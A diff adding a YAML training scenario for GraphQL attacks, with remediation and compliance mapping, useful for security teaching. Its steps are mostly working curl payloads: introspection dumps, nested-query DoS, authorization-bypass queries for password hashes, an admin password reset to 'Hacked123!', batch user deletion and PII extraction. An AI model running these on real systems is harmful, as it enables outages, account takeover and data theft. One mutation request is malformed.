@@ -1,0 +1,163 @@
+# Category: Web Application Security - Injection Attacks
+name: "GraphQL Injection & Introspection Abuse"
+id: "web-graphql-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Identify and exploit GraphQL endpoint vulnerabilities including introspection
+  abuse, query depth attacks, batch query flooding, and authorization bypasses.
+  Map findings to OWASP API Security Top 10 and SOC 2 CC6.1 logical access controls.
+
+learning_objectives:
+  - Enumerate GraphQL schema via introspection queries
+  - Exploit query depth/complexity vulnerabilities for DoS
+  - Bypass authorization via field-level access control flaws
+  - Map GraphQL security findings to compliance frameworks
+
+tools:
+  - graphql-cop
+  - inql
+  - burp_suite_community
+  - curl
+  - jq
+  - postman
+
+prerequisites:
+  - Target GraphQL endpoint URL (e.g., /graphql, /api/graphql)
+  - Authorization for API security testing
+  - Basic understanding of GraphQL query/mutation syntax
+  - Valid authentication token if endpoint requires auth
+
+steps:
+  - id: step1
+    phase: "reconnaissance"
+    action: "Detect GraphQL endpoint and test introspection"
+    commands:
+      - "# Test if introspection is enabled (default behavior)"
+      - "curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' https://[target_url]/graphql"
+      - "# Use graphql-cop for automated enumeration"
+      - "graphql-cop -u https://[target_url]/graphql -v"
+      - "# Check for alternative endpoint paths"
+      - "for path in /graphql /api/graphql /graph /api/graph /v1/graphql; do curl -s -o /dev/null -w \"%{http_code}\" https://[target_domain]$path; done"
+    expected_output: "GraphQL schema JSON or error indicating introspection status"
+    detection: "WAF logs showing __schema or __type queries; unusual POST request patterns to /graphql"
+
+  - id: step2
+    phase: "enumeration"
+    action: "Map schema and identify sensitive fields/mutations"
+    commands:
+      - "# Extract full schema with inql"
+      - "inql -t https://[target_url]/graphql -o /tmp/graphql_schema.graphql"
+      - "# Search for sensitive field names"
+      - "grep -i -E 'password|email|token|admin|secret|pii|credit' /tmp/graphql_schema.graphql"
+      - "# Identify mutations that modify data"
+      - "grep -A5 'type Mutation' /tmp/graphql_schema.graphql | grep -E 'create|update|delete|modify'"
+      - "# Check for batch query support (potential DoS vector)"
+      - "curl -X POST -H 'Content-Type: application/json' -d '[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]' https://[target_url]/graphql"
+    expected_output: "Mapped schema with identified sensitive fields, mutations, and batch query support"
+    compliance_mapping: ["OWASP API Security Top 10 - API2:2023", "SOC 2 CC6.1"]
+
+  - id: step3
+    phase: "exploitation"
+    action: "Test query depth/complexity vulnerabilities"
+    commands:
+      - "# Nested query depth attack (potential DoS)"
+      - "curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{user{id friends{id friends{id friends{id}}}}}\"}' https://[target_url]/graphql"
+      - "# Alias-based query flooding"
+      - "curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{u1:user{id} u2:user{id} u3:user{id} u4:user{id} u5:user{id}}\"}' https://[target_url]/graphql"
+      - "# Test field-level authorization bypass"
+      - "curl -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer [user_token]' -d '{\"query\":\"{adminUser{id email passwordHash}}\"}' https://[target_url]/graphql"
+    expected_output: "Response indicating DoS susceptibility or unauthorized data access"
+    risk_level: "high"
+    detection: "Application logs showing deeply nested queries; rate limiting triggers; unusual alias patterns"
+
+  - id: step4
+    phase: "exploitation"
+    action: "Exploit authorization bypasses via field selection"
+    commands:
+      - "# Test if user can query other users' data"
+      - "curl -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer [user_token]' -d '{\"query\":\"{user(id:\\\"[other_user_id]\\\"){email phone address}}\"}' https://[target_url]/graphql"
+      - "# Test mutation authorization (e.g., password change)"
+      - "curl -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer [user_token]' -d '{\"mutation\":\"{changePassword(userId:\\\"[admin_id]\\\",newPassword:\\\"Hacked123!\\\") {success}}\"}' https://[target_url]/graphql"
+      - "# Test batch mutation abuse"
+      - "curl -X POST -H 'Content-Type: application/json' -d '[{\"query\":\"mutation{deleteUser(id:\\\"1\\\")}\"},{\"query\":\"mutation{deleteUser(id:\\\"2\\\")}\"}]' https://[target_url]/graphql"
+    expected_output: "Successful unauthorized data access or mutation execution"
+    compliance_mapping: ["OWASP API Security Top 10 - API5:2023", "PCI DSS v4.0-7.2.1"]
+
+  - id: step5
+    phase: "post_exploitation"
+    action: "Extract sensitive data via authorized/unauthorized queries"
+    commands:
+      - "# Dump user PII if authorization bypassed"
+      - "curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{users{edges{node{id email phone createdAt}}}}\"}' https://[target_url]/graphql | jq '.data.users.edges[].node'"
+      - "# Export results for reporting"
+      - "curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{users{edges{node{id email}}}}\"}' https://[target_url]/graphql > /tmp/graphql_dump.json"
+      - "# Validate data classification of extracted fields"
+      - "cat /tmp/graphql_dump.json | jq '.data.users.edges[].node | select(.email != null)' | grep -E '@|\\+1|SSN'"
+    expected_output: "Structured JSON output of extracted user data; classification assessment"
+    compliance_mapping: ["GDPR Article 32", "SOC 2 CC7.1"]
+
+detection:
+  network_indicators:
+    - "High volume of POST requests to /graphql with complex query structures"
+    - "Requests containing __schema, __type, or deeply nested field selections"
+    - "Batch query arrays (JSON array at root level) to GraphQL endpoint"
+  log_indicators:
+    - "Application logs: Query complexity warnings or timeout errors"
+    - "Authentication logs: Successful queries for data outside user's scope"
+    - "WAF logs: Blocked GraphQL introspection or batch query patterns"
+  endpoint_indicators:
+    - "graphql-cop, inql, or custom GraphQL scanning tool execution"
+    - "Burp Suite GraphQL plugin usage in request history"
+
+remediation:
+  immediate:
+    - "Disable introspection in production: {\"query\":\"{__schema{types{name}}}\"}\" should return error"
+    - "Implement query depth limiting (max depth: 3-5) and complexity analysis"
+    - "Add authentication/authorization checks at field level, not just operation level"
+  long_term:
+    - "Deploy GraphQL-specific WAF rules (introspection blocking, batch query limiting)"
+    - "Integrate GraphQL schema linting into CI/CD (graphql-eslint, graphql-schema-linter)"
+    - "Implement persisted queries to prevent arbitrary query execution"
+    - "Conduct quarterly GraphQL security reviews as part of SOC 2 CC6.1 evidence"
+
+compliance_controls:
+  - standard: "OWASP API Security Top 10 2023"
+    control: "API2:2023-Broken Authentication"
+    description: "Authentication flaws in API endpoints allowing unauthorized access"
+  - standard: "OWASP API Security Top 10 2023"
+    control: "API5:2023-Broken Object Level Authorization"
+    description: "Failure to validate object-level access controls in API operations"
+  - standard: "SOC 2 Type II"
+    control: "CC6.1"
+    description: "Logical access controls protect against unauthorized data access"
+  - standard: "PCI DSS v4.0"
+    control: "7.2.1"
+    description: "Access to system components and cardholder data is restricted based on need-to-know"
+
+variables:
+  target_url: "https://api.example.com/graphql"
+  target_domain: "api.example.com"
+  user_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+  other_user_id: "usr_12345"
+  admin_id: "usr_admin_001"
+
+assessment_questions:
+  - "Why is GraphQL introspection dangerous in production environments?"
+  - "How do query depth limits mitigate GraphQL-based DoS attacks?"
+  - "What is the difference between operation-level and field-level authorization in GraphQL?"
+  - "Which OWASP API Security category covers GraphQL batch query flooding?"
+  - "How would you implement persisted queries to improve GraphQL security?"
+
+references:
+  - url: "https://owasp.org/www-project-api-security/"
+    title: "OWASP API Security Top 10"
+  - url: "https://github.com/dolevf/graphql-cop"
+    title: "graphql-cop - GraphQL Security Auditor"
+  - url: "https://github.com/doyensec/inql"
+    title: "Inql - GraphQL Security Scanner"
+  - url: "https://graphql.org/learn/security/"
+    title: "GraphQL Security Best Practices"
